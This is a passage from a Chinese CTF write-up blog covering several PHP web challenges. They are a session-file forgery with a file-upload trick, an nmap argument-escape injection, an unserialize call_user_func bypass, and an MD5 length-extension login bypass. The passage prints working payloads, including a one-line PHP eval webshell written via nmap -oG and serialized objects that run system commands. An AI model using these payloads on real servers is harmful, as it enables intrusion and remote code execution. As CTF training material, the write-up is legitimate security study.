class="token punctuation">(</span><span class="token string">'/(\.\.\/|\.\.\\\\)/'</span><span class="token punctuation">,</span> <span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'invalid file path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'file not exist'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: application/force-download'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Length: '</span><span class="token punctuation">.</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Disposition: attachment; filename="'</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token string">"downloaded"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">'error while saving'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$download_result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>分析代码，得到flag的条件为session的username为admin且success,txt存在。</p><p>而且检测success.txt的file_exists()函数的特点意味着我们建立一个同名文件夹也可以满足条件。</p><p><a href="https://imgchr.com/i/0aTfpD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0aTfpD.png" srcset="/img/loading.gif" alt="0aTfpD.png"></a></p><p>三个传参，direction控制文件上传和下载；attr为新建文件夹名；filename为读取的文件名。</p><p>先抓个包看一下session以及它文件中的内容：</p><p><a href="https://imgchr.com/i/0aTKfS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0aTKfS.png" srcset="/img/loading.gif" alt="0aTKfS.png"></a></p><p><a href="https://imgchr.com/i/0aTYT0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0aTYT0.png" srcset="/img/loading.gif" alt="0aTYT0.png"></a></p><p>这个格式的序列化是php_binary引擎。</p><p>综上，大概思路就是：上传一个伪装成admin的session文件，再创建一个名为sucess,txt的文件夹即可满足条件。</p><p>重点代码</p><pre class=" language-php"><code class="language-php">        <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$dir_path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//为/var/babyctf/attr/filename</span>        <span class="token variable">$file_path</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"_"</span><span class="token punctuation">.</span><span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string">"sha256"</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'up_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//为/var/babyctf/attr/filename_sha256(tmp_name)</span></code></pre><p>也就是说，我们这里让伪造成admin的session文件命名为sess进行上传。</p><p>然后用脚本求出hash,并改动PHPSESSID就可以达成第一个条件。</p><p><a href="https://imgchr.com/i/0aLnxO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0aLnxO.png" srcset="/img/loading.gif" alt="0aLnxO.png"></a></p><p>432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p><p>用postman进行上传</p><p><a href="https://imgchr.com/i/0dPwa8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0dPwa8.png" srcset="/img/loading.gif" alt="0dPwa8.png"></a></p><p>验证一下，已经传上去了</p><p><a href="https://imgchr.com/i/0dPbs1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0dPbs1.png" srcset="/img/loading.gif" alt="0dPbs1.png"></a></p><p>现在再给attr传success.txt创建文件夹；</p><p><a href="https://imgchr.com/i/0dinzj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0dinzj.png" srcset="/img/loading.gif" alt="0dinzj.png"></a></p><p>bp这边改下session，得到flag。</p><p><a href="https://imgchr.com/i/0diLlj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0diLlj.png" srcset="/img/loading.gif" alt="0diLlj.png"></a></p><h1 id="2020-网鼎杯-朱雀组-Web-nmap"><a href="#2020-网鼎杯-朱雀组-Web-nmap" class="headerlink" title="2020-网鼎杯-朱雀组-Web-nmap"></a>2020-网鼎杯-朱雀组-Web-nmap</h1><p> <strong>考点：参数逃逸，nmap使用</strong></p><p>打开就是nmap扫描，查看源码发现提示 /flag</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5CUsers%5C12986%5CDesktop%5C3.png" srcset="/img/loading.gif" alt="3"></p><p>nmap这类题会想到的两个函数：</p><pre><code>string escapeshellarg ( string $arg )string escapeshellcmd ( string $command)</code></pre><p><strong>escapeshellarg</strong> — 把字符串转码为可以在 shell 命令里使用的参数</p><p>转义字符串$arg中的单引号并使用单引号包裹此部分</p><p>使得$arg只能传递一个参数，且不能执行不同的命令；</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011162454612.png" srcset="/img/loading.gif" alt="image-20201011162454612"></p><p><strong>escapeshellcmd</strong> — shell 元字符转义</p><p>对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。</p><p>转义&amp; # ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] { } $ 、x0A和xF，’和”仅在落单时被转义</p><p>使得$command只能执行一个命令，但可以传递多个参数；</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011163816415.png" srcset="/img/loading.gif" alt="image-20201011163816415"></p><p>然而这两个函数一起出现就会存在问题（arg先，cmd后），如图，文本被分为三个部分：</p><p>简化后为：<strong>12\ 3&#39;</strong></p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011165732532.png" srcset="/img/loading.gif" alt="image-20201011165732532"></p><p>综上可以构造payload:</p><pre><code>127.0.0.1&#39; -iL /flag -oN aaa.txt &#39;</code></pre><p>本地测试如下：</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011175635921.png" srcset="/img/loading.gif" alt="image-20201011175635921"></p><p>访问aaa.txt，得到flag。这里也可以看到最后执行的命令。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011175837439.png" srcset="/img/loading.gif" alt="image-20201011175837439"></p><p>网上的其他做法是传马；</p><p>payload</p><pre><code>&#39; &lt;?= @eval($_POST[&quot;pd&quot;]);?&gt; -oG pd.phtml &#39;</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011182343649.png" srcset="/img/loading.gif" alt="image-20201011182343649"></p><h1 id="2020-网鼎杯-朱雀组-Web-phpweb"><a href="#2020-网鼎杯-朱雀组-Web-phpweb" class="headerlink" title="2020-网鼎杯-朱雀组-Web-phpweb"></a>2020-网鼎杯-朱雀组-Web-phpweb</h1><p>主页东西很少，页面定时提交表单刷新。</p><p>抓个包看一下,应该是执行的函数和他的传参</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011194538663.png" srcset="/img/loading.gif" alt="image-20201011194538663"></p><p>用eval执行phpinfo被拦住了，需要绕过waf。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011194803464.png" srcset="/img/loading.gif" alt="image-20201011194803464"></p><p>先读一下index.php</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011195421461.png" srcset="/img/loading.gif" alt="image-20201011195421461"></p><pre class=" language-php+HTML"><code class="language-php+HTML"><!DOCTYPE html><html><head>    <title>phpweb</title>    <style type="text/css">        body {            background: url("bg.jpg") no-repeat;            background-size: 100%;        }        p {            color: white;        }    </style></head><body><script language="javascript">    setTimeout("document.form1.submit()",5000)</script><p>    <?php    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");    function gettime($func, $p) {        $result = call_user_func($func, $p);        $a= gettype($result);        if ($a == "string") {            return $result;        } else {return "";}    }    class Test {        var $p = "Y-m-d h:i:s a";        var $func = "date";        function __destruct() {            if ($this->func != "") {                echo gettime($this->func, $this->p);            }        }    }    $func = $_REQUEST["func"];    $p = $_REQUEST["p"];    if ($func != null) {        $func = strtolower($func);        if (!in_array($func,$disable_fun)) {            echo gettime($func, $p);        }else {            die("Hacker...");        }    }    ?></p><form id="form1" name="form1" action="index.php" method="post">    <input type="hidden" id="func" name="func" value="date">    <input type="hidden" id="p" name="p" value="Y-m-d h:i:s a"></form></body></html></code></pre><p>能禁的基本都禁了。</p><p>但这个gettime方法里有call_user_func函数，再加上本身有个Test类，那就可以用反序列化了。</p><pre><code>&lt;?php    class Test {        var $p = &quot;ls&quot;;        var $func = &quot;system&quot;;    }$a=new Test();echo serialize($a);?&gt;</code></pre><p>payload如下，可以看到执行成功；</p><pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011200952514.png" srcset="/img/loading.gif" alt="image-20201011200952514"></p><p>相似的，查看根目录再读取flag。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011201319348.png" srcset="/img/loading.gif" alt="image-20201011201319348"></p><p>payload:</p><pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:20:&quot;cat /flag_2911028111&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011201411539.png" srcset="/img/loading.gif" alt="image-20201011201411539"></p><h2 id="ByteCTF-2019-Web-ezcms"><a href="#ByteCTF-2019-Web-ezcms" class="headerlink" title="ByteCTF-2019-Web-ezcms"></a>ByteCTF-2019-Web-ezcms</h2><p>考点：md5拓展攻击，phar反序列化</p><p>进来是个登录界面</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019174530573.png" srcset="/img/loading.gif" alt="image-20201019174530573"></p><p>随便输下账户密码进入文件上传界面</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019174621449.png" srcset="/img/loading.gif" alt="image-20201019174621449"></p><p>点这个view detail是下面这种界面，返回上传的文件类型和文件位置。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019174712097.png" srcset="/img/loading.gif" alt="image-20201019174712097"></p><p>随便上传一个文件，出现下面的回显。也就是说上传要求admin权限。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201021170641488.png" srcset="/img/loading.gif" alt="image-20201021170641488"></p><p>先扫一下，扫出了<a href="http://www.zip。代码审计。" target="_blank" rel="noopener">www.zip。代码审计。</a></p><p>index.php是刚刚的登录页面，它要求传入的password不能等于”admin”。</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php</span><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">===</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"u r not admin !!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;script>location.href="upload.php";&lt;/script>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>看下config.php相关登录的部分,可以用md5拓展攻击满足条件。</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//config.php</span><span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">"********"</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"hash"</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">.</span><span class="token string">"adminadmin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">"********"</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">.</span><span class="token variable">$username</span><span class="token punctuation">.</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Profile</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">"********"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">admin</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Admin</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$size</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$file_tmp</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$upload_dir</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content_check</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$file_tmp</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span> <span class="token operator">=</span> <span class="token string">'sandbox/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">,</span> <span class="token string">'lolololol, i control all'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token variable">$size</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_tmp</span> <span class="token operator">=</span> <span class="token variable">$file_tmp</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content_check</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Check</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将是否为admin的结果存入$checker</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'u r not admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content_check</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">size</span> <span class="token operator">></span> <span class="token number">204800</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"your file is too big"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_tmp</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.'</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>//用hashpump构造payload</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201021170019191.png" srcset="/img/loading.gif" alt="image-20201021170019191"></p><p>向用户名传admin,密码传这个进行登录。</p><pre><code>admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00dwm2</code></pre><p>再向上传界面添加cookie user后，刷新页面。</p><pre><code>user=4a4273909fdfabb4aa22b55264e7330e</code></pre><p>可以看到文件已经上传成功了。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201021170500217.png" srcset="/img/loading.gif" alt="image-20201021170500217"></p><p>要想方法传shell。但从源码中可以看到，由于.htaccess内容完全被控制，导致php文件无法正常解析。</p><pre class=" language-php"><code class="language-php">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">,</span> <span class="token string">'lolololol, i control all'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token 